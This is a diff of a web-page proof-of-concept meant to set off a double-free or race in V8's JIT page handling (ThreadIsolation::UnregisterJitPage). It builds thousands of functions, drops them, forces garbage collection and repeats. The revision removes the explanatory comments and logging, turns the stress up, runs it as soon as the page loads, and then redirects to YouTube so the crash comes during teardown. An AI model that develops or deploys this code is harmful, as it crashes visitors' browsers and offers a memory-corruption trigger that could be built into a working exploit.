@@ -1,88 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>V8 ThreadIsolation Bad-Free Trigger (PoC)</title>
+  <title>V8 Bad-Free Trigger → YouTube</title>
 </head>
 <body>
 <script>
-// Target: Stress JIT allocation + GC + function destruction
-// Goal: Trigger race/double-free in ThreadIsolation::UnregisterJitPage
+// Optimized for speed: no unnecessary delays, max JIT churn
 
-// Generate unique function bodies to force new JIT allocations
 function makeJitFunction(seed) {
   const body = `
     let a = ${seed};
-    for (let i = 0; i < 1000; i++) {
-      a = (a * 1664525 + 1013904223) | 0;
-    }
+    for (let i = 0; i < 2000; i++) a = (a * 1664525 + 1013904223) | 0;
     return a;
   `;
   return new Function(body);
 }
 
-// Aggressive function churn + GC pressure
-async function triggerStress() {
+function triggerStress() {
   const funcs = [];
-  const maxFuncs = 5000; // High churn
+  const N = 8000; // Push harder
 
-  // Phase 1: Allocate many JITed functions
-  for (let i = 0; i < maxFuncs; i++) {
+  // Phase 1: Rapid JIT allocation
+  for (let i = 0; i < N; i++) {
     const f = makeJitFunction(i);
-    f(); // Force JIT compilation (Optimized if hot)
-    funcs.push(f);
+    f(); // Force compilation
+    funcs[i] = f;
   }
 
-  // Phase 2: Nullify references rapidly to make them collectible
-  for (let i = 0; i < funcs.length; i += 2) {
+  // Phase 2: Aggressive nulling (make collectible)
+  for (let i = 0; i < N; i += 1) {
     funcs[i] = null;
   }
 
-  // Force multiple GC sweeps
+  // Force GC if available (no await — sync burst)
   if (typeof gc === 'function') {
-    for (let i = 0; i < 10; i++) {
-      gc(); // Requires --expose-gc (for testing only)
-      await new Promise(r => setTimeout(r, 1));
-    }
+    for (let i = 0; i < 15; i++) gc();
   }
 
-  // Phase 3: Re-allocate while old pages may still be in sweeper queue
-  const moreFuncs = [];
-  for (let i = 0; i < maxFuncs; i++) {
-    const f = makeJitFunction(i + maxFuncs);
+  // Phase 3: Re-allocate under pressure
+  const funcs2 = [];
+  for (let i = 0; i < N; i++) {
+    const f = makeJitFunction(i + N);
     f();
-    moreFuncs.push(f);
+    funcs2[i] = f;
   }
+  funcs2.length = 0;
 
-  // Rapid cleanup again
-  moreFuncs.length = 0;
-
-  // Final GC burst
   if (typeof gc === 'function') {
-    for (let i = 0; i < 5; i++) {
-      gc();
-      await new Promise(r => setTimeout(r, 0));
-    }
+    for (let i = 0; i < 10; i++) gc();
   }
-
-  console.log("Stress sequence completed.");
 }
 
-// Main runner
-(async () => {
-  // Warn if --expose-gc not available (less effective without it)
-  if (typeof gc !== 'function') {
-    console.warn("Run Chrome with --js-flags='--expose-gc' for better effect.");
-  }
+// Run stress immediately and repeatedly — no async delays
+for (let round = 0; round < 8; round++) {
+  triggerStress();
+}
 
-  // Run multiple rounds to increase race window
-  for (let round = 0; round < 5; round++) {
-    console.log("Round", round + 1);
-    await triggerStress();
-    await new Promise(r => setTimeout(r, 10));
-  }
-
-  console.log("PoC finished. Watch for ASan crash in UnregisterJitPage.");
-})();
+// After max stress, navigate to YouTube to trigger full teardown
+// This may cause V8 to sweep JIT pages during context destruction
+setTimeout(() => {
+  location.href = "https://www.youtube.com";
+}, 0);
 </script>
 </body>
 </html>
